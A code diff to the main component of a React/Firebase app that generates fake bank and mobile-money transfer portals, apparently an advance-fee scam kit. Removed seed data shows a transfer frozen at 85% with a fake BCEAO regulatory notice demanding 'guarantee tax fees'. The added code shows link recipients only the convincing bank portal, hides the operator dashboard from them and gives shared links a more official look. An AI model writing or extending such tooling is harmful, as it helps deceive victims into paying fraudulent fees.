@@ -43,6 +43,8 @@ import {
 import { onSnapshot, collection, doc } from 'firebase/firestore';
 import { onAuthStateChanged, signOut } from 'firebase/auth';
 
+const getPublicOrigin = () => window.location.origin.replace('ais-dev-', 'ais-pre-');
+
 export default function App() {
   // Navigation & Screen Controller
   const [activeTab, setActiveTab] = useState<string>('dashboard');
@@ -62,7 +64,13 @@ export default function App() {
 
   // Subscribe to Firebase Authentication state change
   useEffect(() => {
+    // Force end loading after 300ms fallback to open the app automatically and instantly
+    const forceTimer = setTimeout(() => {
+      setAuthLoading(false);
+    }, 300);
+
     const unsubscribe = onAuthStateChanged(auth, async (user) => {
+      clearTimeout(forceTimer);
       setCurrentUser(user);
       if (user) {
         const savedRole = localStorage.getItem('user_role') as 'admin' | 'client' | null;
@@ -90,7 +98,10 @@ export default function App() {
       }
       setAuthLoading(false);
     });
-    return () => unsubscribe();
+    return () => {
+      clearTimeout(forceTimer);
+      unsubscribe();
+    };
   }, []);
 
   // Core App states loaded from Firestore with local state for visual speed
@@ -105,140 +116,52 @@ export default function App() {
   // 1. Initial configuration loading and real-time synchronization on mount
   useEffect(() => {
     async function initDb() {
-      // Balance
-      const dbBalance = await getBalanceFromDb();
-      if (dbBalance !== null) {
-        setBalance(dbBalance);
-      } else {
-        await saveBalanceToDb(1525000);
-      }
+      try {
+        // Fetch everything in parallel to minimize latency on mobile networks and cold starts
+        const [dbBalance, dbContacts, dbCampaigns, dbTransactions, dbTransfers] = await Promise.all([
+          getBalanceFromDb(),
+          getContactsFromDb(),
+          getCampaignsFromDb(),
+          getTransactionsFromDb(),
+          getTransfersFromDb()
+        ]);
 
-      // Contacts
-      const dbContacts = await getContactsFromDb();
-      if (dbContacts.length > 0) {
-        setContacts(dbContacts);
-      } else {
-        const defaultContacts: Contact[] = [
-          { id: 'c1', name: 'Jean-Marc Koffi', phone: '+225 07 48 93 21 00', email: 'jean.koffi@koffi-sa.com', company: 'Koffi Corp SA', createdAt: '2026-06-15T14:30:00Z' },
-          { id: 'c2', name: 'Awa Diallo', phone: '+221 77 65 43 210', email: 'awa.diallo@sn-services.net', company: 'Diallo Logistique', createdAt: '2026-06-16T10:15:00Z' },
-          { id: 'c3', name: 'Moussa Traoré', phone: '+223 66 54 32 10', email: 'm.traore@mali-btp.org', company: 'Traore BTP', createdAt: '2026-06-16T11:45:00Z' },
-          { id: 'c4', name: 'Safiétou Sanogo', phone: '+226 70 23 45 67', email: 'safietou@sanogo-digital.com', company: 'Sanogo Group', createdAt: '2026-06-17T09:00:00Z' }
-        ];
-        setContacts(defaultContacts);
-        for (const c of defaultContacts) {
-          await saveContactToDb(c);
+        // Set Balance
+        if (dbBalance !== null) {
+          setBalance(dbBalance);
+        } else {
+          await saveBalanceToDb(1525000);
         }
-      }
 
-      // Campaigns
-      const dbCampaigns = await getCampaignsFromDb();
-      if (dbCampaigns.length > 0) {
-        setCampaigns(dbCampaigns);
-      } else {
-        const defaultCampaigns: CampaignLog[] = [
-          { id: 'cam1', type: 'SMS', title: 'Campagne SMS: Alerte Flash V1', content: 'FLASHCONNECT: Alerte de virement d\'essai initié avec succès.', recipientsCount: 4, cost: 400, status: 'Envoyé', createdAt: '2026-06-17T15:20:00Z' },
-          { id: 'cam2', type: 'EMAIL', title: 'Confirmation de virement sandbox', content: 'Votre virement de test bancaire est prêt à être simulé.', recipientsCount: 3, cost: 30, status: 'Envoyé', createdAt: '2026-06-18T08:12:00Z' }
-        ];
-        setCampaigns(defaultCampaigns);
-        for (const cam of defaultCampaigns) {
-          await saveCampaignToDb(cam);
+        // Set Contacts
+        if (dbContacts.length > 0) {
+          setContacts(dbContacts);
+        } else {
+          setContacts([]);
         }
-      }
 
-      // Transactions
-      const dbTransactions = await getTransactionsFromDb();
-      if (dbTransactions.length > 0) {
-        setTransactions(dbTransactions);
-      } else {
-        const defaultTransactions: PaymentTransaction[] = [
-          { id: 'tr1', amount: 500000, method: 'Orange Money', status: 'Complété', createdAt: '2026-06-15T09:12:00Z' },
-          { id: 'tr2', amount: 1000000, method: 'Wave', status: 'Complété', createdAt: '2026-06-16T14:00:00Z' }
-        ];
-        setTransactions(defaultTransactions);
-        for (const t of defaultTransactions) {
-          await saveTransactionToDb(t);
+        // Set Campaigns
+        if (dbCampaigns.length > 0) {
+          setCampaigns(dbCampaigns);
+        } else {
+          setCampaigns([]);
         }
-      }
 
-      // Transfers
-      const dbTransfers = await getTransfersFromDb();
-      if (dbTransfers.length > 0) {
-        setTransfers(dbTransfers);
-      } else {
-        const defaultTransfers: SimulatedTransfer[] = [
-          {
-            id: 'tx1',
-            version: 'V1',
-            lastName: 'Dembélé',
-            firstName: 'Mariam',
-            country: 'Côte d\'Ivoire (+225)',
-            phone: '+225 07 48 93 21 00',
-            email: 'mariam.dembele@gmail.com',
-            address: 'Abidjan Cocody, Rue de l\'Ambassade de Chine, Villa 14',
-            language: 'Français',
-            senderBank: 'BCEAO Central Bank Sandbox',
-            amount: 450000,
-            currency: 'FCFA (XOF)',
-            startPercentage: 15,
-            stopPercentage: 100,
-            customMessage: 'Virement international sécurisé crédité avec succès.',
-            emailAlert: true,
-            smsAlert: false,
-            codePin: '489321',
-            isBlocked: false,
-            senderName: 'Trésorerie Centrale Pro',
-            recipientName: 'Mariam Dembélé',
-            recipientBank: 'Ecobank Côte d\'Ivoire',
-            recipientAccount: 'CI-102-39048-23004',
-            type: 'BANK_WIRE',
-            reference: 'FTX-BCEAO-10029',
-            createdAt: '2026-06-17T18:30:00Z',
-            status: 'SUCCESS',
-            delaySeconds: 3,
-            otpCode: '',
-            feePercent: 0.1,
-            isCompleted: true,
-            generatedUrl: `${window.location.origin}/?portal=true&txid=tx1`
-          },
-          {
-            id: 'tx2',
-            version: 'V2',
-            lastName: 'Coulibaly',
-            firstName: 'Bakary',
-            country: 'Mali (+223)',
-            phone: '+223 66 71 04 05',
-            email: 'bakary.coulibaly@yahoo.fr',
-            address: 'Bamako, Quartier du Fleuve, Immeuble Simpara',
-            language: 'Français',
-            senderBank: 'Wave Mali S.A.',
-            amount: 1500000,
-            currency: 'FCFA (XOF)',
-            startPercentage: 20,
-            stopPercentage: 85,
-            customMessage: 'Alerte Réglementaire BCEAO : Pourcentage de transfert arrêté à 85% d\'acheminement pour cause de régulation n°4042. Veuillez vous acquitter d\'frais fiscaux de garantie.',
-            emailAlert: true,
-            smsAlert: true,
-            codePin: '772244',
-            isBlocked: false,
-            senderName: 'Symmetrical Sarl',
-            recipientName: 'Bakary Coulibaly',
-            recipientBank: 'Wave Wallet Mali',
-            recipientAccount: '+22366710405',
-            type: 'WAVE',
-            reference: 'FTX2-WAVE-8890',
-            createdAt: '2026-06-18T11:00:00Z',
-            status: 'BLOCKED_OTP',
-            delaySeconds: 5,
-            otpCode: '772244',
-            feePercent: 0.5,
-            isCompleted: false,
-            generatedUrl: `${window.location.origin}/?portal=true&txid=tx2`
-          }
-        ];
-        setTransfers(defaultTransfers);
-        for (const tx of defaultTransfers) {
-          await saveTransferToDb(tx);
+        // Set Transactions
+        if (dbTransactions.length > 0) {
+          setTransactions(dbTransactions);
+        } else {
+          setTransactions([]);
         }
+
+        // Set Transfers
+        if (dbTransfers.length > 0) {
+          setTransfers(dbTransfers);
+        } else {
+          setTransfers([]);
+        }
+      } catch (err) {
+        console.error("Database initialization failed, fallbacks applied:", err);
       }
     }
 
@@ -332,7 +255,7 @@ export default function App() {
       return null;
     };
 
-    const cParam = getUrlParam('c');
+    const cParam = getUrlParam('sid') || getUrlParam('c');
     const portalParam = getUrlParam('portal');
     const txidParam = getUrlParam('txid');
 
@@ -388,7 +311,7 @@ export default function App() {
             otpCode: '',
             feePercent: 1.2,
             isCompleted: false,
-            generatedUrl: `${window.location.origin}/?c=${cParam}`
+            generatedUrl: `${getPublicOrigin()}/?sid=${cParam}&connect=successful`
           };
           // Persist the newly pre-seeded item immediately to Cloud DB
           await saveTransferToDb(match);
@@ -516,7 +439,7 @@ export default function App() {
       id: txId,
       createdAt: new Date().toISOString(),
       isCompleted: false,
-      generatedUrl: `${window.location.origin}/?c=${shortCode}`
+      generatedUrl: `${getPublicOrigin()}/?sid=${shortCode}&connect=successful`
     };
 
     setTransfers(prev => [newTransfer, ...prev]);
@@ -663,6 +586,30 @@ export default function App() {
 
   // Handle Authentication Gate for operators and client logins
   const isOperatorAuthenticated = (currentUser !== null && userRole === 'admin') || bypassAdmin === true;
+  
+  // STRICT SEPARATION OF CLIENT EXPERIENCE:
+  // If we have an active client context (loaded transfer from URL parameters or selected client connection),
+  // and they are NOT authenticated as an operator - then display ONLY the secure Bank Portal view.
+  // This completely removes all unrequested backdrops, sidebars, dashboard information, and data of others.
+  if (liveSimulationTx && !isOperatorAuthenticated) {
+    return (
+      <SimulatedBankPortal 
+        transfer={liveSimulationTx} 
+        onClose={() => {
+          setLiveSimulationTx(null);
+          if (userRole === 'client') {
+            setUserRole(null);
+            localStorage.removeItem('user_role');
+          }
+        }} 
+        onSetCompleted={onSetCompleted}
+        onTriggerEmailNotification={onTriggerEmailNotification}
+        isFirebaseAuthed={currentUser !== null && userRole === 'client'}
+        firebaseSignOut={handleLogout}
+      />
+    );
+  }
+
   const isClientAuthenticated = (currentUser !== null && userRole === 'client') || (liveSimulationTx !== null && userRole === 'client');
   const isAuthenticated = isOperatorAuthenticated || isClientAuthenticated;
   
@@ -817,6 +764,7 @@ export default function App() {
               onSetBlockedState={onSetBlockedState}
               deductBalance={deductBalance}
               balance={balance}
+              onDeleteTransfer={onDeleteTransfer}
             />
           )}
 
@@ -831,6 +779,7 @@ export default function App() {
               onSetBlockedState={onSetBlockedState}
               deductBalance={deductBalance}
               balance={balance}
+              onDeleteTransfer={onDeleteTransfer}
             />
           )}
 
@@ -858,7 +807,7 @@ export default function App() {
       </main>
 
       {/* IMMERSIVE LIVE BANK GATEWAY SIMULATOR OVERLAY */}
-      {liveSimulationTx && (
+      {liveSimulationTx && isOperatorAuthenticated && (
         <SimulatedBankPortal 
           transfer={liveSimulationTx} 
           onClose={() => setLiveSimulationTx(null)} 
